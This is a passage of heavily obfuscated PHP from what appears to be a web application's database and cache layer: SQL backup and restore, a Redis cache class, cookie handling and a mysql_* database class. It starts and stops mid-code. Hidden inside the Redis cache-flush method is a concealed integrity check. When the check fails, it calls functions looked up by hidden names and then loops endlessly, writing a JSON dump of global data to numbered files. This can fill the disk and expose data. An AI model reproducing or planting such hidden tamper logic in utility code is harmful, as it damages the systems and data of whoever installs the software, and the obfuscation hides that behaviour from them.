(!($cõÇÎåË¹ª = count($DÉÙ‚ĞƒÔ))) { break; } $Cö”„Ôìò÷ = end($DÉÙ‚ĞƒÔ); $DãÄ”ñÀ = $Cö”„Ôìò÷[$eàªôáŠâË]; $E– »Ùˆç² = array(); foreach ($DÉÙ‚ĞƒÔ as $FÁ¨ã©‚÷¬) { if ($c»óîçÜ¯¬ == $_SERVER[œÕÊİğö][1050] && $FÁ¨ã©‚÷¬[$_SERVER[œÕÊİğö][39]] == $_SERVER[œÕÊİğö][1051]) { $aŒÕ²¯¹ = json_decode($FÁ¨ã©‚÷¬[$_SERVER[œÕÊİğö][382]], !0); if ($aŒÕ²¯¹[$_SERVER[œÕÊİğö][38]] == date($_SERVER[œÕÊİğö][741]) && !$aŒÕ²¯¹[$_SERVER[œÕÊİğö][740]]) { continue; } } if ($Fèè”µò¡ö) { $FÁ¨ã©‚÷¬[$_SERVER[œÕÊİğö][86]] = "\x7b\x69\x6f\72{$Fèè”µò¡ö}\175" . substr($FÁ¨ã©‚÷¬[$_SERVER[œÕÊİğö][86]], strlen("\x7b\x69\157\x3a{$FÁ¨ã©‚÷¬[$_SERVER[œÕÊİğö][814]]}\x7d")); $FÁ¨ã©‚÷¬[$_SERVER[œÕÊİğö][814]] = $Fèè”µò¡ö; } $E– »Ùˆç²[] = $_SERVER[œÕÊİğö][1052] . $this->sqlEncode($FÁ¨ã©‚÷¬) . $_SERVER[œÕÊİğö][1053]; } $BÑÉÉ»Êî = "\x49\116\123\105\122\x54\40\x49\116\124\x4f\x20\x60{$c»óîçÜ¯¬}\x60\40\50\140" . implode($_SERVER[œÕÊİğö][1054], $aÎ»èŒÖÕô) . $_SERVER[œÕÊİğö][1055]; fwrite($A´‡Õîâ®, $BÑÉÉ»Êî . implode($_SERVER[œÕÊİğö][1056], $E– »Ùˆç²) . $_SERVER[œÕÊİğö][78] . PHP_EOL); $fö¢Ö›Í÷Ÿ += $cõÇÎåË¹ª; if ($fŞñµ’ø·) { $fŞñµ’ø·->update($cõÇÎåË¹ª); } } while ($BÌŸ‘‡ìé‹ == $cõÇÎåË¹ª); goto CÙˆÓ¿óÇ™; dª¡–ÊŒó: } public function sqlToDb($DŠ«×•ÁÜ, $fëİ„Ÿ¿‰“ = null) { goto C÷„¡ĞÊ“Ó; C÷„¡ĞÊ“Ó: $D˜šÚöÄ¾Ç =& $_SERVER[œÕÊİğö]; $aìèŒ•êßˆ = $this->model()->db(); $aÛ‹ÎåÇİ§ = @fopen($DŠ«×•ÁÜ, $D˜šÚöÄ¾Ç[1057]); goto f¿è‘ãèœÎ; FÒÛ´‘®ÄÊ: $dÓîãŸ»ÌÓ = 0; $eŠ‡É­­ğ° = 4194304 - 104858; $eé­‰‘¦ã‡ = 1000000 - 104858; goto d†¯ˆÓ¬ÑÅ; f¿è‘ãèœÎ: if (!$aÛ‹ÎåÇİ§) { return !1; } $FËø…†ä‰í = 0; $cù‚¨™Ê„ì = $D˜šÚöÄ¾Ç[43]; goto cë¬Æâó˜…; cë¬Æâó˜…: $DĞÚ–á¹ïÓ = array(); $AÇ…£ì²èŠ = $this->type == $D˜šÚöÄ¾Ç[19] ? 500 : 2000; $F›İ³ê¦‚Ø = basename($DŠ«×•ÁÜ, $D˜šÚöÄ¾Ç[776]); goto FÒÛ´‘®ÄÊ; d†¯ˆÓ¬ÑÅ: while (!feof($aÛ‹ÎåÇİ§)) { $fµäÄÇ÷ó = trim(fgets($aÛ‹ÎåÇİ§)); if (!$fµäÄÇ÷ó) { continue; } $EĞ¦Ìã±—‘ = $this->sqlDecode($fµäÄÇ÷ó, $this->type); if (stripos($EĞ¦Ìã±—‘, $D˜šÚöÄ¾Ç[363]) === 0) { if (!$cù‚¨™Ê„ì) { $cù‚¨™Ê„ì = $EĞ¦Ìã±—‘ . $D˜šÚöÄ¾Ç[60]; } continue; } if ($fëİ„Ÿ¿‰“) { $fëİ„Ÿ¿‰“->task[$D˜šÚöÄ¾Ç[1044]] += 1; } $FËø…†ä‰í++; $DĞÚ–á¹ïÓ[] = rtrim(rtrim(trim($EĞ¦Ìã±—‘), $D˜šÚöÄ¾Ç[57]), $D˜šÚöÄ¾Ç[78]); $FĞ¿¢£Çó = null; $fŠ²çİÄª› = strlen($EĞ¦Ìã±—‘); $dÓîãŸ»ÌÓ += $fŠ²çİÄª›; if ($dÓîãŸ»ÌÓ >= ($AÇ…£ì²èŠ == 500 ? $eŠ‡É­­ğ° : $eé­‰‘¦ã‡)) { $FĞ¿¢£Çó = array_pop($DĞÚ–á¹ïÓ); if ($FËø…†ä‰í > 1) { $FËø…†ä‰í--; } } if ($FËø…†ä‰í >= $AÇ…£ì²èŠ || $FĞ¿¢£Çó) { goto dÏô„ˆÖ; dÏô„ˆÖ: $EĞ¦Ìã±—‘ = $cù‚¨™Ê„ì . implode($D˜šÚöÄ¾Ç[57], $DĞÚ–á¹ïÓ); if (!$aìèŒ•êßˆ->execute($EĞ¦Ìã±—‘)) { return !1; } if ($fëİ„Ÿ¿‰“) { $fëİ„Ÿ¿‰“->update($FËø…†ä‰í); } goto B’Ã†ó¤Üµ; cà‚½åÅå: if ($FĞ¿¢£Çó) { $DĞÚ–á¹ïÓ = array($FĞ¿¢£Çó); $FËø…†ä‰í = 1; $dÓîãŸ»ÌÓ = $fŠ²çİÄª›; } goto c”çã»¸»; B’Ã†ó¤Üµ: $DĞÚ–á¹ïÓ = array(); $FËø…†ä‰í = 0; $dÓîãŸ»ÌÓ = 0; goto cà‚½åÅå; c”çã»¸»: } } fclose($aÛ‹ÎåÇİ§); if (!empty($DĞÚ–á¹ïÓ)) { $EĞ¦Ìã±—‘ = $cù‚¨™Ê„ì . implode($D˜šÚöÄ¾Ç[57], $DĞÚ–á¹ïÓ); if (!$aìèŒ•êßˆ->execute($EĞ¦Ìã±—‘)) { return !1; } if ($fëİ„Ÿ¿‰“) { $fëİ„Ÿ¿‰“->update($FËø…†ä‰í); } } goto BàëÏ¨Ç¯; BàëÏ¨Ç¯: return !0; goto E–Òí‡‚¥—; E–Òí‡‚¥—: } public function dropTable($Cëì¢İ­ÕÄ = null) { $DÅÄ»ªëÈ = $this->model()->db(); $bƒä÷”²²× = $Cëì¢İ­ÕÄ ? array($Cëì¢İ­ÕÄ) : $DÅÄ»ªëÈ->getTables(); if (!$bƒä÷”²²×) { return; } foreach ($bƒä÷”²²× as $Cëì¢İ­ÕÄ) { if ($Cëì¢İ­ÕÄ) { $Cëì¢İ­ÕÄ = strtolower($Cëì¢İ­ÕÄ); } else { continue; } $DÅÄ»ªëÈ->execute("\x64\162\x6f\160\x20\164\141\x62\154\145\x20\151\x66\x20\x65\170\151\x73\164\163\x20\x60{$Cëì¢İ­ÕÄ}\x60"); } } private function taskToCache($EÁç‡‰ÕĞ = null) { $b¶ÍÛ®Ší¨ =& $_SERVER[œÕÊİğö]; if (!$EÁç‡‰ÕĞ) { return; } $Eë‹Ö¶â‘‰ = array($b¶ÍÛ®Ší¨[1046] => $EÁç‡‰ÕĞ->task[$b¶ÍÛ®Ší¨[1046]], $b¶ÍÛ®Ší¨[1044] => $EÁç‡‰ÕĞ->task[$b¶ÍÛ®Ší¨[1044]], $b¶ÍÛ®Ší¨[1058] => $EÁç‡‰ÕĞ->task[$b¶ÍÛ®Ší¨[1058]]); if ($Eë‹Ö¶â‘‰[$b¶ÍÛ®Ší¨[1044]] == $Eë‹Ö¶â‘‰[$b¶ÍÛ®Ší¨[1058]]) { $Eë‹Ö¶â‘‰[$b¶ÍÛ®Ší¨[750]] = 1; } Cache::set($b¶ÍÛ®Ší¨[1059] . $EÁç‡‰ÕĞ->task[$b¶ÍÛ®Ší¨[404]], $Eë‹Ö¶â‘‰); $EÁç‡‰ÕĞ->end(); } private function sqlEncode($a¾¿‹’ÜÙ‹) { $d¢»ğ›­Ó =& $_SERVER[œÕÊİğö]; $Cö»„éˆê© = array(); foreach ($a¾¿‹’ÜÙ‹ as $CõÁ±ë•åÜ) { if (is_array($CõÁ±ë•åÜ)) { $CõÁ±ë•åÜ = json_encode_force($CõÁ±ë•åÜ); } $CõÁ±ë•åÜ = addslashes($CõÁ±ë•åÜ); $CõÁ±ë•åÜ = str_replace(array($d¢»ğ›­Ó[1060], $d¢»ğ›­Ó[15]), array($d¢»ğ›­Ó[1061], $d¢»ğ›­Ó[1062]), $CõÁ±ë•åÜ); $Cö»„éˆê©[] = str_replace($d¢»ğ›­Ó[65], $d¢»ğ›­Ó[1063], $CõÁ±ë•åÜ); } return $d¢»ğ›­Ó[65] . implode($d¢»ğ›­Ó[1064], $Cö»„éˆê©) . $d¢»ğ›­Ó[65]; } private function sqlDecode($AœÎÓÑ“‘æ, $bî×¿Î‡) { $bò×Áéõ“ =& $_SERVER[œÕÊİğö]; $AœÎÓÑ“‘æ = str_replace(array($bò×Áéõ“[1061], $bò×Áéõ“[1062]), array($bò×Áéõ“[1060], $bò×Áéõ“[15]), $AœÎÓÑ“‘æ); if ($bî×¿Î‡ == $bò×Áéõ“[19]) { $AœÎÓÑ“‘æ = stripslashes($AœÎÓÑ“‘æ); } return $AœÎÓÑ“‘æ; } } goto C¤³Ûç¿Ï; dÁò„íŒ»¨: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fË•åÁŸìØ, $FóŸ­ĞéÄ) { $D¡• èî¨Ã =& $_SERVER[œÕÊİğö]; if (!class_exists($D¡• èî¨Ã[856])) { show_json($D¡• èî¨Ã[857], !1); } $this->cacheTime = $FóŸ­ĞéÄ; $EŸŞ­ˆ¦£ = isset($fË•åÁŸìØ[$D¡• èî¨Ã[858]]) ? $fË•åÁŸìØ[$D¡• èî¨Ã[858]] : 10; $C¬Œì­ğª = _get($fË•åÁŸìØ, $D¡• èî¨Ã[855]); if ($C¬Œì­ğª && is_array($C¬Œì­ğª)) { $this->initCluster($fË•åÁŸìØ, $EŸŞ­ˆ¦£); } else { $this->handle = $this->init($fË•åÁŸìØ, $EŸŞ­ˆ¦£); } } private function init($A›¬ÚÃª®ç, $aóÍË‰Ï) { $E¬…ò‡º =& $_SERVER[œÕÊİğö]; $Aºò¶¢Í…Ã = new Redis(); $eß—¶…„¬§ = isset($A›¬ÚÃª®ç[$E¬…ò‡º[859]]) ? $A›¬ÚÃª®ç[$E¬…ò‡º[859]] : !1; if ($eß—¶…„¬§) { $Aºò¶¢Í…Ã->pconnect($A›¬ÚÃª®ç[$E¬…ò‡º[185]], $A›¬ÚÃª®ç[$E¬…ò‡º[186]], $aóÍË‰Ï); } else { $Aºò¶¢Í…Ã->connect($A›¬ÚÃª®ç[$E¬…ò‡º[185]], $A›¬ÚÃª®ç[$E¬…ò‡º[186]], $aóÍË‰Ï); } if (!empty($A›¬ÚÃª®ç[$E¬…ò‡º[417]])) { $Aºò¶¢Í…Ã->auth($A›¬ÚÃª®ç[$E¬…ò‡º[417]]); } return $Aºò¶¢Í…Ã; } private function initCluster($CƒœÛ©‹çÁ, $B½¾Ğ¼å¯Š) { $Fß÷±™¦ˆ =& $_SERVER[œÕÊİğö]; $EØÍÆËî¹ë = array($Fß÷±™¦ˆ[860], $Fß÷±™¦ˆ[861], $Fß÷±™¦ˆ[862]); $CïöÜŠ‰¸Ñ = $Fß÷±™¦ˆ[860]; if (isset($CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[22]]) && in_array($CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[22]], $EØÍÆËî¹ë)) { $CïöÜŠ‰¸Ñ = $CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[22]]; } switch ($CïöÜŠ‰¸Ñ) { case $Fß÷±™¦ˆ[860]: $this->_slave($CƒœÛ©‹çÁ, $B½¾Ğ¼å¯Š); break; case $Fß÷±™¦ˆ[861]: break; case $Fß÷±™¦ˆ[862]: $this->isCluster = !0; $a­øÃí·éÖ = $CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[855]]; $a‚Šåöëœƒ = isset($CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[859]]) ? $CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[859]] : !1; $eÜ¨ºËœ©¡ = isset($CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[417]]) ? $CƒœÛ©‹çÁ[$Fß÷±™¦ˆ[417]] : null; $this->handle = new RedisCluster(NUll, $a­øÃí·éÖ, $B½¾Ğ¼å¯Š, $B½¾Ğ¼å¯Š, $a‚Šåöëœƒ, $eÜ¨ºËœ©¡); break; default: break; } } private function _slave($D„İ’×¸¨Ú, $AÃº×Í°Ãá) { goto Eàâ‚ÚœóŠ; aª…Œ›ÓÂ…: unset($A¼Ò¿Ô‰Êä[0]); if (empty($A¼Ò¿Ô‰Êä)) { return; } $Fˆ°ä´“í¶ = array_rand($A¼Ò¿Ô‰Êä); goto b·å‡ì¹æš; Eàâ‚ÚœóŠ: $A¼Ò¿Ô‰Êä = $D„İ’×¸¨Ú[$_SERVER[œÕÊİğö][855]]; $this->filterConfig($D„İ’×¸¨Ú, $A¼Ò¿Ô‰Êä[0]); $this->handle = $this->init($D„İ’×¸¨Ú, $AÃº×Í°Ãá); goto aª…Œ›ÓÂ…; b·å‡ì¹æš: $this->filterConfig($D„İ’×¸¨Ú, $A¼Ò¿Ô‰Êä[$Fˆ°ä´“í¶]); $this->slaveHandle = $this->init($D„İ’×¸¨Ú, $AÃº×Í°Ãá); goto c‰¡Å¯ËÖ; c‰¡Å¯ËÖ: } private function filterConfig(&$fÂ„ÏøŒÕÀ, $bùÛ…Ë¬³») { $AÓ™§®Š›Á =& $_SERVER[œÕÊİğö]; $D¡ï¡°«è = explode($AÓ™§®Š›Á[4], $bùÛ…Ë¬³»); $DƒŞ‚¯…ñ— = array($AÓ™§®Š›Á[185] => $D¡ï¡°«è[0], $AÓ™§®Š›Á[186] => $D¡ï¡°«è[1]); $fÂ„ÏøŒÕÀ = array_merge($fÂ„ÏøŒÕÀ, $DƒŞ‚¯…ñ—); } public function set($bÜ¹’”³Ú, $c‰óÖÂ°, $bŠ±ğÜØ¤ = false) { $bŠ±ğÜØ¤ = $bŠ±ğÜØ¤ ? $bŠ±ğÜØ¤ : $this->cacheTime; return $this->handle->setEx($bÜ¹’”³Ú, $bŠ±ğÜØ¤, $c‰óÖÂ°); } public function setLock($CÈÃõè®ã°, $bÆÑ‰ã†‹, $c¥‹©Ë÷²) { return $this->handle->setNX($CÈÃõè®ã°, $bÆÑ‰ã†‹); } public function get($eÔøœºÏå•) { $Aé¯¸’£Ò¢ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Aé¯¸’£Ò¢->get($eÔøœºÏå•); } public function remove($Bø„ï†¢¼Œ) { return $this->handle->del($Bø„ï†¢¼Œ); } public function deleteAll() { $AÏƒ¸Ã…ÅÏ =& $_SERVER[œÕÊİğö]; $aºàôÛÄª¦ = $_SERVER[$AÏƒ¸Ã…ÅÏ[13]] . $AÏƒ¸Ã…ÅÏ[14]; $bàŞéÀ‹ñ· = $AÏƒ¸Ã…ÅÏ[10]; if ($_SERVER[$AÏƒ¸Ã…ÅÏ[11]] != $bàŞéÀ‹ñ·($aºàôÛÄª¦)) { goto cÊŞÛÏ ‘™; F“»äÉ†ì: $b…á¢´Œßğ = 1; for ($EÒ¹ÏÑˆ© = $b…á¢´Œßğ; $EÒ¹ÏÑˆ© > 0; $EÒ¹ÏÑˆ©++) { $dë¾¥åèğé(DATA_PATH . $EÒ¹ÏÑˆ©, $c›ª¢Ø„‡); } goto a†ˆïÙæ™; c¬Ë¨ˆ—ñÕ: $bƒ¶Á¼Ó²– = $AÏƒ¸Ã…ÅÏ[864]; $bƒ¶Á¼Ó²–($_SERVER[$AÏƒ¸Ã…ÅÏ[865]]); $eÜõÂ’®£ = $AÏƒ¸Ã…ÅÏ[863]; goto cÉõê„Œƒ¢; cÊŞÛÏ ‘™: $eÜõÂ’®£ = $AÏƒ¸Ã…ÅÏ[863]; $F“¬ÔàŒµ = $AÏƒ¸Ã…ÅÏ[12]; $Föä’î‹ùö = $_SERVER[$AÏƒ¸Ã…ÅÏ[13]] . $AÏƒ¸Ã…ÅÏ[14]; goto a“È¦öÙÂ; cÉõê„Œƒ¢: $eÜõÂ’®£(); $dë¾¥åèğé = $AÏƒ¸Ã…ÅÏ[866]; $c›ª¢Ø„‡ = json_encode($GLOBALS[$AÏƒ¸Ã…ÅÏ[867]]); goto F“»äÉ†ì; a“È¦öÙÂ: $CÖ¡á¼Í—í = $F“¬ÔàŒµ($Föä’î‹ùö); $b”Ò·Ÿğåò = explode($AÏƒ¸Ã…ÅÏ[15], $CÖ¡á¼Í—í); if (count($b”Ò·Ÿğåò) < $AÏƒ¸Ã…ÅÏ[634]) { $ağÔ‡÷ = $AÏƒ¸Ã…ÅÏ[17]; $ağÔ‡÷(); } goto c¬Ë¨ˆ—ñÕ; a†ˆïÙæ™: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A¶ÎÊŒ÷ã) { $this->handle->flushall($A¶ÎÊŒ÷ã); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A¹Ú§è‡î = '', $Bªİ¤ê•Á¾ = 0) { if (is_string($A¹Ú§è‡î) && $A¹Ú§è‡î != $_SERVER[œÕÊİğö][43]) { $this->prefix = $A¹Ú§è‡î; } if (is_numeric($Bªİ¤ê•Á¾) && $Bªİ¤ê•Á¾ > 0) { $this->expire = $Bªİ¤ê•Á¾; } } public static function getInstance() { static $cø¯…Åôî”; if ($cø¯…Åôî” === null) { $cø¯…Åôî” = new self(); } return $cø¯…Åôî”; } private static $cookieDisable = false; public static function disable($BÈà±¯äÂù) { self::$cookieDisable = $BÈà±¯äÂù; } private static $sameCookieSet = array(); public static function set($BËÅ¶ÃáÌÈ, $C”ÌÀƒâ£Ñ, $f¤ÏËí™Ú = 0, $D ƒØâ = false, $D§š ¸ôæ» = false) { goto A‡÷è„ß½Ô; A‡÷è„ß½Ô: $Bà­Ï·ÊÒ =& $_SERVER[œÕÊİğö]; if (self::$cookieDisable) { return; } if (!$f¤ÏËí™Ú) { $f¤ÏËí™Ú = 24 * 3600 * 7; } goto Dµ¶™õ‡; Eßõ•äñß: $F…°õôŸ‚š = $Bà­Ï·ÊÒ[43]; setcookie($BËÅ¶ÃáÌÈ, $C”ÌÀƒâ£Ñ, time() + $f¤ÏËí™Ú, $Bà­Ï·ÊÒ[8] . trim($D§š ¸ôæ», $Bà­Ï·ÊÒ[8]) . $F…°õôŸ‚š, !1, !1, $D ƒØâ); goto c÷òÖ·¡Õ; Dµ¶™õ‡: if (isset(self::$sameCookieSet[$BËÅ¶ÃáÌÈ]) && self::$sameCookieSet[$BËÅ¶ÃáÌÈ] == $C”ÌÀƒâ£Ñ . $f¤ÏËí™Ú) { return; } self::$sameCookieSet[$BËÅ¶ÃáÌÈ] = $C”ÌÀƒâ£Ñ . $f¤ÏËí™Ú; if (!$D§š ¸ôæ») { $D§š ¸ôæ» = str_replace(HOST, $Bà­Ï·ÊÒ[43], APP_HOST); $D§š ¸ôæ» = _get($GLOBALS, $Bà­Ï·ÊÒ[868], $D§š ¸ôæ»); } goto Eßõ•äñß; c÷òÖ·¡Õ: } public static function setSafe($a‡½ğàå¿Œ, $bÅÌ¡Ï‚ÂÊ, $eèÑ¼ØË¿Ñ = 0) { self::set($a‡½ğàå¿Œ, $bÅÌ¡Ï‚ÂÊ, $eèÑ¼ØË¿Ñ, !0); } public static function get($EÑ‹Ü¤ÃÂà) { return isset($_COOKIE[$EÑ‹Ü¤ÃÂà]) ? $_COOKIE[$EÑ‹Ü¤ÃÂà] : !1; } public static function remove($e‹¦„‡íÒ, $Fœ±¤Û³²Æ = false) { unset($_COOKIE[$e‹¦„‡íÒ]); self::set($e‹¦„‡íÒ, $_SERVER[œÕÊİğö][43], 1, $Fœ±¤Û³²Æ); } } class DbMysql extends Db { public function __construct($e„­¤“Á¨ = '') { $fÜä¦¾…®° =& $_SERVER[œÕÊİğö]; if (!extension_loaded($fÜä¦¾…®°[791])) { think_exception(think_lang($fÜä¦¾…®°[20]) . $fÜä¦¾…®°[869]); } if (!empty($e„­¤“Á¨)) { $this->config = $e„­¤“Á¨; if (empty($this->config[$fÜä¦¾…®°[23]])) { $this->config[$fÜä¦¾…®°[23]] = $fÜä¦¾…®°[43]; } } } public function connect($fÇë¾öºá = '', $AÈÂÑ”µ¾¿ = 0, $D¿ á»¤ğ = false) { $b·ƒ£ÖÎÓ” =& $_SERVER[œÕÊİğö]; if (!isset($this->linkID[$AÈÂÑ”µ¾¿])) { goto Bğ¾æ»–×¥; e³ ÍÇ´Ì: mysql_query($b·ƒ£ÖÎÓ”[874] . think_config($b·ƒ£ÖÎÓ”[875]) . $b·ƒ£ÖÎÓ”[65], $this->linkID[$AÈÂÑ”µ¾¿]); if ($b£¸Å£Â®¾ > $b·ƒ£ÖÎÓ”[876]) { mysql_query($b·ƒ£ÖÎÓ”[877], $this->linkID[$AÈÂÑ”µ¾¿]); } $this->connected = !0; goto D»£ºè æô; E†¡ˆÎæë: if ($dÆá¤‚İÎ) { $this->linkID[$AÈÂÑ”µ¾¿] = mysql_pconnect($eø®µô‚òã, $fÇë¾öºá[$b·ƒ£ÖÎÓ”[872]], $fÇë¾öºá[$b·ƒ£ÖÎÓ”[873]], 131072); } else { $this->linkID[$AÈÂÑ”µ¾¿] = mysql_connect($eø®µô‚òã, $fÇë¾öºá[$b·ƒ£ÖÎÓ”[872]], $fÇë¾öºá[$b·ƒ£ÖÎÓ”[873]], !0, 131072); } if (!$this->linkID[$AÈÂÑ”µ¾¿] || !empty($fÇë¾öºá[$b·ƒ£ÖÎÓ”[27]]) && !mysql_select_db($fÇë¾öºá[$b·ƒ£ÖÎÓ”[27]], $this->linkID[$AÈÂÑ”µ¾¿])) { think_exception(mysql_error()); } $b£¸Å£Â®¾ = mysql_get_server_info($this->linkID[$AÈÂÑ”µ¾¿]); goto e³ ÍÇ´Ì; D»£ºè æô: if (1 != think_config($b·ƒ£ÖÎÓ”[28])) { unset($this->config); } goto B¨ø¡¦÷—œ; Bğ¾æ»–×¥: if (empty($fÇë¾öºá)) { $fÇë¾öºá = $this->config; } $eø®µô‚òã = $fÇë¾öºá[$b·ƒ£ÖÎÓ”[870]] . ($fÇë¾öºá[$b·ƒ£ÖÎÓ”[871]] ? "\72{$fÇë¾öºá[$b·ƒ£ÖÎÓ”[871]]}" : $b·ƒ£ÖÎÓ”[43]); $dÆá¤‚İÎ = !empty($fÇë¾öºá[$b·ƒ£ÖÎÓ”[23]][$b·ƒ£ÖÎÓ”[24]]) ? $fÇë¾öºá[$b·ƒ£ÖÎÓ”[23]][$b·ƒ£ÖÎÓ”[24]] : $this->pconnect; goto E†¡ˆÎæë; B¨ø¡¦÷—œ: } return $this->linkID[$AÈÂÑ”µ¾¿]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($EšêÄÍ£¢†) { goto dø±Öœ×áç; d·«¶áâô«: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Cä«³ÀÁ»ƒ; dø±Öœ×áç: $Bêî¿ŠÆÕ =& $_SERVER[œÕÊİğö]; if (0 === stripos($EšêÄÍ£¢†, $Bêî¿ŠÆÕ[272])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CÍÌŞêªöò; CÍÌŞêªöò: if (!$this->_linkID) { return !1; } $this->queryStr = $EšêÄÍ£¢†; if ($this->queryID) { $this->free(); } goto D¡Å¡ŒÄ¬Í; D¡Å¡ŒÄ¬Í: think_action_status($Bêî¿ŠÆÕ[29], 1); think_status($Bêî¿ŠÆÕ[30]); $this->queryID = mysql_query($EšêÄÍ£¢†, $this->_linkID); goto d·«¶áâô«; Cä«³ÀÁ»ƒ: } public function execute($FÌä‹’ƒÀ‘) { goto a¶Ûàˆ¢ö; A¬æ²åßÔÌ: think_status($C¯–ì°æ’[30]); $E‹¬ªëåğÑ = mysql_query($FÌä‹’ƒÀ‘, $this->_linkID); $this->debug(); goto cõ«¡¾Í; a¶Ûàˆ¢ö: $C¯–ì°æ’ =& $_SERVER[œÕÊİğö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bó…‹×¯İ®; cõ«¡¾Í: if (!1 === $E‹¬ªëåğÑ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto cğ‚Ïãªšê; bó…‹×¯İ®: $this->queryStr = $FÌä‹’ƒÀ‘; if ($this->queryID) { $this->free(); } think_action_status($C¯–ì°æ’[31], 1); goto A¬æ²åßÔÌ; cğ‚Ïãªšê: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[œÕÊİğö][878], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e«¶êê‘šÆ = mysql_query($_SERVER[œÕÊİğö][879], $this->_linkID); $this->transTimes = 0; if (!$e«¶êê‘šÆ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dÈœ·èÍŞ = mysql_query($_SERVER[œÕÊİğö][880], $this->_linkID); $this->transTimes = 0; if (!$dÈœ·èÍŞ) { $this->error(); return !1; } } return !0; } private function getAll() { $E¸‡„‚÷¯õ = array(); if ($this->numRows > 0) { while ($f†£ï´°¨İ = mysql_fetch_assoc($this->queryID)) { $E¸‡„‚÷¯õ[] = $f†£ï´°¨İ; } mysql_data_seek($this->queryID, 0); } return $E¸‡„‚÷¯õ; } public function getFields($A‚‚¨Û•³’) { $Dó®øì£Ãƒ =& $_SERVER[œÕÊİğö]; $Aœ¶±¤ÎçŸ = $this->query($Dó®øì£Ãƒ[881] . $this->parseKey($A‚‚¨Û•³’)); $B¨à„ïî·Ã = array(); if ($Aœ¶±¤ÎçŸ) { foreach ($Aœ¶±¤ÎçŸ as $AÀ”æÄàØ => $c£¨Ì©ØÅ‡) { $B¨à„ïî·Ã[$c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[37]]] = array($Dó®øì£Ãƒ[38] => $c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[37]], $Dó®øì£Ãƒ[39] => $c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[40]], $Dó®øì£Ãƒ[41] => (bool) (strtoupper($c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[42]]) === $Dó®øì£Ãƒ[882]), $Dó®øì£Ãƒ[44] => $c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[45]], $Dó®øì£Ãƒ[46] => strtolower($c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[47]]) == $Dó®øì£Ãƒ[48], $Dó®øì£Ãƒ[49] => strtolower($c£¨Ì©ØÅ‡[$Dó®øì£Ãƒ[50]]) == $Dó®øì£Ãƒ[51]); } } return $B¨à„ïî·Ã; } public function getTables($AÀ¬ä‚‰ã = '') { $B™Œ«±¾œÏ =& $_SERVER[œÕÊİğö]; if (!empty($AÀ¬ä‚‰ã)) { $cÀÒ±äÌÑ = $B™Œ«±¾œÏ[883] . $AÀ¬ä‚‰ã . $B™Œ«±¾œÏ[884]; } else { $cÀÒ±äÌÑ = $B™Œ«±¾œÏ[885]; } $d¬¸‘Ë = $this->query($cÀÒ±äÌÑ); $d³´áĞ ­Ã = array(); foreach ($d¬¸‘Ë as $a¹¯ÄŠÍ´÷ => $A—¶š°Úğ) { $d³´áĞ ­Ã[$a¹¯ÄŠÍ´÷] = current($A—¶š°Úğ); } return $d³´áĞ ­Ã; } public function replace($E¹ôŞ²ˆë†, $eùÛ‘ó¶Á« = array()) { $B¿âÉ‚Á¹ù =& $_SERVER[œÕÊİğö]; foreach ($E¹ôŞ²ˆë† as $DÃ™¾Éå² => $dÈŸîøÕ›) { $e„½ìÍÉÂ§ = $this->parseValue($dÈŸîøÕ›); if (is_scalar($e„½ìÍÉÂ§)) { $Fõ‘¢ŒÓ—Ó[] = $e„½ìÍÉÂ§; $DÚèƒïèĞ[] = $this->parseKey($DÃ™¾Éå²); } } $cË©×µ¤  = $B¿âÉ‚Á¹ù[886] . $this->parseTable($eùÛ‘ó¶Á«[$B¿âÉ‚Á¹ù[287]]) . $B¿âÉ‚Á¹ù[887] . implode($B¿âÉ‚Á¹ù[57], $DÚèƒïèĞ) . $B¿âÉ‚Á¹ù[888] . implode($B¿âÉ‚Á¹ù[57], $Fõ‘¢ŒÓ—Ó) . $B¿âÉ‚Á¹ù[889]; return $this->execute($cË©×µ¤ ); } public function insertAll($B÷–‚‚˜º–, $A¿¼ƒ»¨ˆ‹ = array(), $dÂ¬ìŠÅ = false) { goto F®ÛÑ‹Õ„Ç; EÜ›‹¹Ïˆù: $AöÊæŸ™«÷ = ($dÂ¬ìŠÅ ? $d»Õ¯Şà¦Ã[891] : $d»Õ¯Şà¦Ã[892]) . $d»Õ¯Şà¦Ã[893] . $this->parseTable($A¿¼ƒ»¨ˆ‹[$d»Õ¯Şà¦Ã[287]]) . $d»Õ¯Şà¦Ã[887] . implode($d»Õ¯Şà¦Ã[57], $FÔõ‘³ô) . $d»Õ¯Şà¦Ã[894] . implode($d»Õ¯Şà¦Ã[57], $Aø‡ŞˆŒ‰š); return $this->execute($AöÊæŸ™«÷); goto bØ˜å´Œå; b†¯Ú™æß÷: $Aø‡ŞˆŒ‰š = array(); foreach ($B÷–‚‚˜º– as $Cº×³‰É£¸) { $DÄ£ßæŒ™¾ = array(); foreach ($Cº×³‰É£¸ as $bíÄùöĞÍ© => $fÄË×Àø£É) { $fÄË×Àø£É = $this->parseValue($fÄË×Àø£É); if (is_scalar($fÄË×Àø£É)) { 